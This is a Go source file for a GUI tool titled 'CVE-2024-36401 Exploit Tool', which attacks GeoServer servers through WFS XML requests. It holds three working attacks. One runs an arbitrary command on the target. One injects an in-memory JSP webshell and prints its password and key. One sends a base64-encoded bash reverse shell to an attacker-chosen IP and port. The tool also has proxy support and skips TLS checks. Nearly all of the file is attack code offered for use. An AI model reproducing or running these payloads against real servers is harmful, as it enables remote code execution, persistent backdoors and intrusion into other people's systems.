package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

var proxyURL *url.URL
var proxyLabel *widget.Label // 全局变量，用于显示代理设置

// 代理设置窗口
func proxySettingsWindow() {
	// 新窗口
	proxyWindow := fyne.CurrentApp().NewWindow("设置代理")

	// 输入框
	proxyTypeEntry := widget.NewSelect([]string{"HTTP", "SOCKS"}, func(value string) {})
	proxyAddressEntry := widget.NewEntry()
	proxyAddressEntry.SetPlaceHolder("输入代理地址，例如：http://127.0.0.1:8080")

	resultLabel := widget.NewLabel("")
	// 保存按钮
	saveButton := widget.NewButton("保存代理", func() {
		proxyAddress := proxyAddressEntry.Text
		if proxyAddress != "" {
			parsedURL, err := url.Parse(proxyAddress)
			if err != nil {
				resultLabel.SetText(fmt.Sprintf("代理设置失败：%s", err))
			} else {
				proxyURL = parsedURL
				resultLabel.SetText(fmt.Sprintf("代理设置为：%s", proxyURL))

				// 更新主界面的代理显示标签
				proxyLabel.SetText(fmt.Sprintf("当前代理: %s", proxyURL.String()))

				proxyWindow.Close()
			}
		}
	})

	cleanButton := widget.NewButton("清除代理", func() {
		proxyURL = nil

		// 更新主界面的代理显示标签
		if proxyURL != nil {
			proxyLabel.SetText(fmt.Sprintf("当前代理: %s", proxyURL.String()))
		} else {
			proxyLabel.SetText("当前代理: 无")
		}
		proxyWindow.Close()
	})

	// 布局
	content := container.NewVBox(
		widget.NewLabel("选择代理类型："),
		proxyTypeEntry,
		widget.NewLabel("输入代理地址："),
		proxyAddressEntry,
		saveButton,
		cleanButton,
	)

	proxyWindow.SetContent(content)
	proxyWindow.Resize(fyne.NewSize(400, 200))
	proxyWindow.Show()
}

// 漏洞利用函数，向GeoServer发送恶意请求
func exploit(targetURL, command string) (string, string, error) {
	// 构造Payload
	payload := fmt.Sprintf(`
<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"%s")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>`, command)

	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	// 设置HTTP头
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 如果设置了代理，则使用代理
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	// 发送请求
	client := &http.Client{Transport: tr,
		Timeout: 4 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil
}

func formatTargetURL(input string) string {
	// 正则表达式匹配 http:// 或者 https:// 开头的 URL
	re := regexp.MustCompile(`^(http://|https://)?([0-9a-zA-Z\.-]+)(:[0-9]+)?(/.*)?$`)

	// 匹配输入
	match := re.FindStringSubmatch(input)

	if match != nil {
		// match[2] 是主机名或 IP 地址
		// match[3] 是端口（可能为空）
		host := match[2]
		port := match[3]

		// 如果 URL 没有 http:// 或 https://，则默认加上 http://
		if !strings.HasPrefix(input, "http://") && !strings.HasPrefix(input, "https://") {
			return fmt.Sprintf("http://%s%s/geoserver/wfs", host, port)
		}

		// 规范化 URL
		return fmt.Sprintf("%s%s/geoserver/wfs", match[1], host+port)
	}

	// 如果输入不匹配预期格式，返回空字符串或错误信息
	return ""
}

func inject(targetURL string) (string, string, error) {
	payload := fmt.Sprintf(`<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>`)

	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	// 设置HTTP头
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	//跳过tls证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// 如果设置了代理，则使用代理
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}

	// 发送请求
	client := &http.Client{Transport: tr,
		Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil

}

func reverseshell(targetURL, ip string, port string) (string, string, error) {
	address := []byte(fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`, ip, port))
	encoded := base64.StdEncoding.EncodeToString(address)
	command := fmt.Sprintf(`bash -c {echo,%s}|{base64,-d}|{bash,-i}`, encoded)
	payload := fmt.Sprintf(`<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"%s")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>`, command)
	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	// 设置HTTP头
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	//跳过tls证书验证

	if err != nil {
		log.Fatal(err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 如果设置了代理，则使用代理
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	// 发送请求
	client := &http.Client{Transport: tr,
		Timeout: 4 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil

}
func main() {
	// 初始化Fyne应用
	myApp := app.NewWithID("GUI-EXP")
	myWindow := myApp.NewWindow("CVE-2024-36401 Exploit Tool")

	// 创建输入框
	urlEntry := widget.NewEntry()
	urlEntry.SetPlaceHolder("输入GeoServer漏洞URL，例如：http://victim-ip:port/geoserver/wfs")

	domainEntry := widget.NewEntry()
	domainEntry.SetPlaceHolder("输入要执行的命令")

	ipEntry := widget.NewEntry()
	ipEntry.SetPlaceHolder("输入反弹shell的ip")

	portEntry := widget.NewEntry()
	portEntry.SetPlaceHolder("输入反弹的端口")

	// 显示代理 URL 的标签，初始为“无代理”
	proxyLabel = widget.NewLabel("当前代理: 无")

	resultLabel := widget.NewLabel("")

	// 创建按钮
	exploitButton := widget.NewButton("执行漏洞验证", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		command := domainEntry.Text
		if targetURL == "" || command == "" {
			resultLabel.SetText("请确保所有字段都已填写")
			return
		}

		// 执行漏洞利用函数
		result, status_code, err := exploit(targetURL, command)
		if err != nil {
			resultLabel.SetText(fmt.Sprintf("执行失败: %s", err))
		} else {
			resultLabel.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result))
		}
	})

	//内存马按钮
	exploitButton1 := widget.NewButton("小于JDK15通过js引擎注入内存马", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		if targetURL == "" {
			resultLabel.SetText("请确保所有字段都已填写")
			return
		}
		go func() {
			result, status_code, err := inject(targetURL)
			if err != nil {
				resultLabel.SetText(fmt.Sprintf("执行失败: %s", err))
			} else {
				resultLabel.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result, "加密器: JAVA_AES_BASE64\n密码: pass\n密钥: key\n请求路径: /*\n请求头: Referer: Nplojptkx\n脚本类型: JSP"))
			}

		}()
	})

	exploitButton2 := widget.NewButton("反弹shell", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		ip := ipEntry.Text
		port := portEntry.Text
		if targetURL == "" {
			resultLabel.SetText("请确保所有字段都已填写")
			return
		}
		go func() {
			result, status_code, err := reverseshell(targetURL, ip, port)
			if err != nil {
				resultLabel.SetText(fmt.Sprintf("执行失败: %s", err))
			} else {
				resultLabel.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result))
			}

		}()
	})

	//将两个输入框放到水平容器里
	//hBox := container.NewHBox(ipEntry, portEntry, exploitButton2)
	hBox := container.NewVBox(ipEntry, portEntry, exploitButton2)
	ipEntry.Resize(fyne.NewSize(100, ipEntry.MinSize().Width))
	portEntry.Resize(fyne.NewSize(100, portEntry.MinSize().Width))

	// 添加代理按钮
	proxyButton := widget.NewButton("设置代理", func() {
		proxySettingsWindow()
	})

	// 布局
	content := container.NewVBox(
		widget.NewLabel("CVE-2024-36401 漏洞验证工具"),
		proxyButton,
		urlEntry,
		domainEntry,
		exploitButton,
		exploitButton1,
		hBox,
		proxyLabel,
		resultLabel,
	)

	// 设置窗口内容并显示
	myWindow.SetContent(content)
	myWindow.Resize(fyne.NewSize(600, 300))
	myWindow.ShowAndRun()
}
